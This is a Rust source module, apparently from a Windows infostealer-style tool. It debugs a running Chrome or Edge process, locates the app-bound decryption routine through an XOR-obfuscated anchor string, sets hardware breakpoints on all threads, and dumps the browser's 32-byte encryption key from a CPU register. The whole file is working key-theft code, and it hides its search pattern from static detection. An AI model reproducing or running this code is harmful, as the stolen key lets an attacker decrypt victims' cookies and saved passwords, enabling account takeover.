use std::mem::zeroed;

use windows::Win32::Foundation::{
    CloseHandle, DBG_CONTINUE, EXCEPTION_SINGLE_STEP, HANDLE,
};
use windows::Win32::System::Diagnostics::Debug::{
    ContinueDebugEvent, GetThreadContext, SetThreadContext, WaitForDebugEvent, CONTEXT,
    CONTEXT_CONTROL_AMD64, CONTEXT_DEBUG_REGISTERS_AMD64, CONTEXT_INTEGER_AMD64,
    CREATE_THREAD_DEBUG_EVENT, DEBUG_EVENT, EXCEPTION_DEBUG_EVENT, EXIT_PROCESS_DEBUG_EVENT,
    LOAD_DLL_DEBUG_EVENT, LOAD_DLL_DEBUG_INFO,
};
use windows::Win32::System::Threading::{OpenThread, ResumeThread, SuspendThread, THREAD_ALL_ACCESS};

use crate::mem;
use crate::pe;
use crate::process;

const ANCHOR_KEY: u8 = 0x5A;
const ANCHOR_ENC: [u8; 44] = [
    0x15, 0x09, 0x19, 0x28, 0x23, 0x2a, 0x2e, 0x74, 0x1b, 0x2a, 0x2a, 0x18,
    0x35, 0x2f, 0x34, 0x3e, 0x0a, 0x28, 0x35, 0x2c, 0x33, 0x3e, 0x3f, 0x28,
    0x74, 0x1e, 0x3f, 0x39, 0x28, 0x23, 0x2a, 0x2e, 0x74, 0x08, 0x3f, 0x29,
    0x2f, 0x36, 0x2e, 0x19, 0x35, 0x3e, 0x3f, 0x5a,
];

fn anchor_key() -> u8 {
    // Route the key through a runtime pointer load (black-boxed) so the
    // compiler cannot constant-fold the whole transform and re-emit the
    // plaintext anchor in .rdata.
    let key: [u8; 1] = [ANCHOR_KEY];
    let p = std::hint::black_box(&key[0] as *const u8);
    unsafe { *p }
}

fn decrypt_anchor() -> Vec<u8> {
    let key = anchor_key();
    ANCHOR_ENC.iter().map(|b| b ^ key).collect()
}
const KEY_LEN: usize = 32;
const DEBUG_EVENT_WAIT_MS: u32 = 500;

/// On x64, Get/SetThreadContext require the CONTEXT buffer to be 16-byte
/// aligned (the C header uses __declspec(align(16)), which the windows crate
/// does not carry over; without this wrapper every call fails with
/// ERROR_INVALID_PARAMETER).
#[repr(C, align(16))]
struct AlignedContext(CONTEXT);

fn set_hw_breakpoint(hthread: HANDLE, addr: usize, clear: bool) -> bool {
    let mut aligned = AlignedContext(unsafe { zeroed() });
    let ctx = &mut aligned.0;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
    if let Err(e) = unsafe { GetThreadContext(hthread, ctx) } {
        eprintln!("[-] GetThreadContext failed: {e}");
        return false;
    }
    if clear {
        ctx.Dr0 = 0;
        ctx.Dr6 = 0;
        ctx.Dr7 = 0;
    } else {
        // Execution breakpoint in debug register slot 0 (Dr0), local enable.
        ctx.Dr0 = addr as u64;
        ctx.Dr7 = 0;
        ctx.Dr7 |= 1;
        ctx.Dr6 = 0;
    }
    if let Err(e) = unsafe { SetThreadContext(hthread, ctx) } {
        eprintln!("[-] SetThreadContext failed: {e}");
        return false;
    }
    true
}

fn arm_thread(hthread: HANDLE, addr: usize, clear: bool) -> bool {
    if unsafe { SuspendThread(hthread) } == u32::MAX {
        eprintln!("[-] SuspendThread failed");
        return false;
    }
    let armed = set_hw_breakpoint(hthread, addr, clear);
    unsafe { ResumeThread(hthread) };
    armed
}

/// Returns the number of threads the breakpoint was actually set on.
fn arm_all_threads(pid: u32, addr: usize, clear: bool) -> usize {
    let mut armed = 0;
    for tid in process::threads_of(pid) {
        if let Ok(hthread) = unsafe { OpenThread(THREAD_ALL_ACCESS, false, tid) } {
            if arm_thread(hthread, addr, clear) {
                armed += 1;
            }
            unsafe { let _ = CloseHandle(hthread); };
        }
    }
    armed
}

fn dll_name(hprocess: HANDLE, load: &LOAD_DLL_DEBUG_INFO) -> Option<String> {
    if load.lpImageName.is_null() {
        return None;
    }
    // lpImageName points at a pointer inside the target's address space.
    let string_ptr: usize = mem::read_value(hprocess, load.lpImageName as usize)?;
    if string_ptr == 0 {
        return None;
    }
    let raw = mem::read_bytes(hprocess, string_ptr, 2048)?;
    let full = if load.fUnicode != 0 {
        let wide: Vec<u16> = raw
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        let end = wide.iter().position(|&c| c == 0).unwrap_or(wide.len());
        String::from_utf16_lossy(&wide[..end])
    } else {
        let end = raw.iter().position(|&b| b == 0).unwrap_or(raw.len());
        String::from_utf8_lossy(&raw[..end]).to_string()
    };
    Some(full.rsplit(['\\', '/']).next().unwrap_or(&full).to_string())
}

fn dump_key(hprocess: HANDLE, tid: u32, edge: bool) -> Option<[u8; KEY_LEN]> {
    let hthread = unsafe { OpenThread(THREAD_ALL_ACCESS, false, tid) }.ok()?;
    let mut aligned = AlignedContext(unsafe { zeroed() });
    let ctx = &mut aligned.0;
    ctx.ContextFlags = CONTEXT_INTEGER_AMD64 | CONTEXT_CONTROL_AMD64;
    unsafe { GetThreadContext(hthread, ctx) }.ok()?;
    println!(
        "[+] Hardware breakpoint hit on thread {tid}, RIP = {:#x}",
        ctx.Rip
    );
    unsafe { let _ = CloseHandle(hthread); };

    // Chrome keeps the key pointer in R15 at this point, Edge in R14.
    let (reg_name, key_ptr_reg) = if edge { ("R14", ctx.R14) } else { ("R15", ctx.R15) };
    if key_ptr_reg == 0 {
        eprintln!("[-] {reg_name} was empty");
        return None;
    }
    println!("[*] Dumping key from {reg_name}");

    let key_ptr: usize = mem::read_value(hprocess, key_ptr_reg as usize)?;
    println!("[*] Encryption key will be at {key_ptr:#x}");
    let key_bytes = mem::read_bytes(hprocess, key_ptr, KEY_LEN)?;
    let key: [u8; KEY_LEN] = key_bytes.as_slice().try_into().ok()?;
    Some(key)
}

fn locate_breakpoint(hprocess: HANDLE, base: usize) -> Option<usize> {
    let anchor = decrypt_anchor();
    let string_va = pe::find_pattern(hprocess, base, &anchor)?;
    pe::find_lea_xref(hprocess, base, string_va)
}

/// Attach as the debugger (the caller already did DebugActiveProcess) and wait
/// until the browser returns from its own app-bound decryption, then steal
/// the key from the register that holds the key pointer.
pub fn run(hprocess: HANDLE, pid: u32, target_module: &str, edge: bool) -> Option<[u8; KEY_LEN]> {
    let mut breakpoint: Option<usize> = None;
    let mut event: DEBUG_EVENT = unsafe { zeroed() };

    loop {
        if unsafe { WaitForDebugEvent(&mut event, DEBUG_EVENT_WAIT_MS) }.is_err() {
            // The debuggee went quiet: startup finished without a hit.
            if let Some(bp) = breakpoint {
                // Detaching with breakpoints still armed would crash it.
                arm_all_threads(pid, bp, true);
            }
            break;
        }

        let tid = event.dwThreadId;
        let ev_pid = event.dwProcessId;

        match event.dwDebugEventCode {
            EXCEPTION_DEBUG_EVENT => {
                let info = unsafe { event.u.Exception };
                let code = info.ExceptionRecord.ExceptionCode;
                // Only trust single-step exceptions from our own debuggee
                // (child processes report debug events to us as well).
                if ev_pid == pid && code == EXCEPTION_SINGLE_STEP && breakpoint.is_some() {
                    let bp = breakpoint?;
                    let key = dump_key(hprocess, tid, edge);
                    arm_all_threads(pid, bp, true); // clear hardware breakpoints
                    unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
                    return key;
                }
            }
            CREATE_THREAD_DEBUG_EVENT => {
                if breakpoint.is_some() && ev_pid == pid {
                    if let Ok(hthread) = unsafe { OpenThread(THREAD_ALL_ACCESS, false, tid) } {
                        arm_thread(hthread, breakpoint?, false);
                        unsafe { let _ = CloseHandle(hthread); };
                    }
                }
            }
            LOAD_DLL_DEBUG_EVENT => {
                if breakpoint.is_none() && ev_pid == pid {
                    let load = unsafe { event.u.LoadDll };
                    if let Some(name) = dll_name(hprocess, &load) {
                        if name.eq_ignore_ascii_case(target_module) {
                            let base = load.lpBaseOfDll as usize;
                            println!("[*] {target_module} loaded at {base:#x}");
                            match locate_breakpoint(hprocess, base) {
                                Some(bp) => {
                                    let total = process::threads_of(pid).len();
                                    let armed = arm_all_threads(pid, bp, false);
                                    println!(
                                        "[*] Hardware breakpoint armed on {armed}/{total} threads"
                                    );
                                    breakpoint = Some(bp);
                                }
                                None => eprintln!(
                                    "[-] Failed to locate the decryption routine; cannot continue"
                                ),
                            }
                        }
                    }
                }
            }
            EXIT_PROCESS_DEBUG_EVENT => {
                println!("[+] The debuggee exited before the key was captured");
                unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
                return None;
            }
            _ => {}
        }
        unsafe { let _ = ContinueDebugEvent(ev_pid, tid, DBG_CONTINUE); };
    }
    None
}
